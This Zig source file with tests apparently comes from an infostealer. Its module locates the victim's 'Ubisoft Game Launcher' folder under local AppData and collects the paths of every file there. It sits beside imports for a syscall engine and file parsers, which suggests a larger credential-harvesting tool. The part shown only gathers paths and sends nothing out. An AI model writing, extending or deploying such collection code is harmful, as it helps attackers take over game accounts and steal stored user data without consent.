const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const file_io = @import("../parsers/file_io.zig");

pub const GameResult = struct {
    source_path: ?[]const u8,
    collected_files: [][]const u8,
    file_count: usize,
};

fn collectDirectoryFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(dir_path, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
            try files.append(full);
        }
    }
    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8) !GameResult {
    const source_path = try std.fs.path.join(allocator, &[_][]const u8{ local_app_data, "Ubisoft Game Launcher" });

    var dir = std.fs.openDirAbsolute(source_path, .{}) catch {
        return GameResult{
            .source_path = null,
            .collected_files = &[_][]const u8{},
            .file_count = 0,
        };
    };
    dir.close();

    const files = try collectDirectoryFiles(allocator, source_path);

    return GameResult{
        .source_path = source_path,
        .collected_files = files,
        .file_count = files.len,
    };
}

fn freeGameResult(result: GameResult, allocator: std.mem.Allocator) void {
    if (result.source_path) |p| allocator.free(p);
    for (result.collected_files) |f| allocator.free(f);
    allocator.free(result.collected_files);
}

const testing = std.testing;

test "collect returns empty for nonexistent uplay" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local");
    defer freeGameResult(result, testing.allocator);
    try testing.expect(result.source_path == null);
    try testing.expectEqual(@as(usize, 0), result.file_count);
}

test "GameResult empty is valid" {
    const result = GameResult{
        .source_path = null,
        .collected_files = &[_][]const u8{},
        .file_count = 0,
    };
    try testing.expectEqual(@as(usize, 0), result.collected_files.len);
}
